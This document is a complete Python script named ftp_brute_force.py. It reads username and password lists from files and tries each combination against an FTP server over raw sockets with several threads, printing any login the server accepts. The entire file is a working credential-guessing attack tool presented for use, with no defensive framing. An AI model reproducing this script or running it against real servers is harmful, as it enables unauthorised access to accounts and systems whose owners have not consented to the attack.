#!/usr/bin/python3

import socket
import sys
from queue import Queue
import threading
import re

try:
	ip = sys.argv[1]
	port = int(sys.argv[2])
	users_list = sys.argv[3]
	passwords_list = sys.argv[4]
	num_threads = int(sys.argv[5])
except:
	print("Usage: ./ftp_brute_force.py [ip] [port] [users_list] [passwords_list] [num_threads]")
	sys.exit()

# creating queue
users_queue = Queue()
passwords_queue = Queue()
	
def fill_queue(queue, file):
	try:
		with open(file, "r") as f:
			for line in f.readlines():
				queue.put(line.strip())
	except Exception as error:
		print(error)
fill_queue(users_queue, users_list)
fill_queue(passwords_queue, passwords_list)
	
def brute(ip, port, username, password):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# creates socket and start connection
		s.connect((ip, port))
		s.recv(1024)
		
		print(f"testing--> {username}:{password}")
		s.send(f"USER {username}\r\n".encode())	# send credentials and receive answers (230 ok 530 incorrect)
		s.recv(1024)
		
		s.send(f"PASS {password}\r\n".encode())
		answer = s.recv(1024).decode()	# the answer is in bytes
		s.send("quit\r\n".encode())
		
		if re.search("230", answer):
			print(f"[+]CREDENTIAL FOUND!!! {username}:{password}")
			sys.exit()	# remove this if you want to continue testing other users and passowrds
	except Exception as error:	# in case of connection error
		print(error)

def attack():
	while not users_queue.empty():
		user = users_queue.get()
		temp_queue = Queue()	# temporary queue to use
		for i in passwords_queue.queue: temp_queue.put(i)	# copying the original queue
		while not temp_queue.empty():
			password = temp_queue.get()
			brute(ip, port, user, password)
	
print("Brute force started!!!")

# threads 
thread_list = []	# list to save threads
for i in range(num_threads):
	t = threading.Thread(target=attack)
	thread_list.append(t)
	
for thread in thread_list:
	thread.start()
for thread in thread_list:
	thread.join()
